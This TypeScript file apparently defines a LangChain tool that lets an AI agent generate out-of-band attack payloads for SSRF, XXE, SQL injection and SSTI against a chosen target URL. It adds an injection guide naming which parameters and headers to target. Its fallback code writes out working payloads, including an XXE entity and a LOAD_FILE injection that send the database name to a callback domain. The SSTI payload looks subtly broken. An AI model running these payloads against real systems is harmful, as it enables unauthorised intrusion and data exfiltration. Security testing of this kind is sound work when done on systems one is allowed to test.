import { z } from 'zod';
import { tool, DynamicStructuredTool } from '@langchain/core/tools';

export function createOOBTriggerTool(oobServer: any): DynamicStructuredTool {
  const schema = z.object({
    payloadType: z.enum(['ssrf', 'xxe', 'sqli', 'ssti']),
    targetUrl: z.string(),
    oobDomain: z.string(),
    technique: z.string().optional(),
  });

  return tool(async (input) => {
    const { payloadType, targetUrl, oobDomain, technique } = schema.parse(input);

    const payload = oobServer?.generatePayload
      ? oobServer.generatePayload(payloadType, oobDomain)
      : generateFallbackPayload(payloadType, oobDomain, technique);

    const callbacks: Record<string, string> = {
      ssrf: `callback URL: http://${oobDomain}/cb/${Date.now()}`,
      xxe: `callback URL: http://${oobDomain}/xxe/${Date.now()}`,
      sqli: `callback URL: http://${oobDomain}/sql/${Date.now()}`,
      ssti: `callback URL: http://${oobDomain}/ssti/${Date.now()}`,
    };

    const injectionGuide: Record<string, string> = {
      ssrf: `Inject the payload into a URL parameter or header that performs server-side requests (e.g. ?url=PAYLOAD, X-Forwarded-For: PAYLOAD)`,
      xxe: `Inject the payload into XML body processing endpoints (POST with Content-Type: application/xml)`,
      sqli: `Inject the payload into SQL query parameters (e.g. ?id=PAYLOAD, POST body fields)`,
      ssti: `Inject the payload into template parameters (e.g. ?name=PAYLOAD, user profile fields)`,
    };

    return `OOB Payload Generator
━━━━━━━━━━━━━━━━━━━━━━
Type:           ${payloadType}
Target:         ${targetUrl}
OOB Domain:     ${oobDomain}
Technique:      ${technique || 'auto'}

Payload:
  ${payload}

Callback URL:
  ${callbacks[payloadType]}

Injection Guide:
  ${injectionGuide[payloadType]}

Detection:
  Monitor your OOB server logs at ${oobDomain} for incoming HTTP/DNS callbacks.
  A callback indicates successful out-of-band data exfiltration or blind detection.`;
  }, {
    name: 'oob_trigger',
    description: 'Generate an out-of-band (OOB) payload for SSRF, XXE, SQLi, or SSTI blind detection via a callback domain',
    schema,
  });
}

function generateFallbackPayload(payloadType: string, oobDomain: string, technique?: string): string {
  const ts = Date.now();
  switch (payloadType) {
    case 'ssrf':
      return `http://${oobDomain}/ssrf/${ts}`;
    case 'xxe':
      return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${oobDomain}/xxe/${ts}">]><root>&xxe;</root>`;
    case 'sqli':
      return `' OR 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\${oobDomain}\\\\',(SELECT database()),'.txt'))--`;
    case 'ssti':
      return `{{ ''.__class__.__mro__[1].__subclasses__() }}http://${oobDomain}/ssti/${ts}`;
    default:
      return `http://${oobDomain}/oob/${ts}`;
  }
}
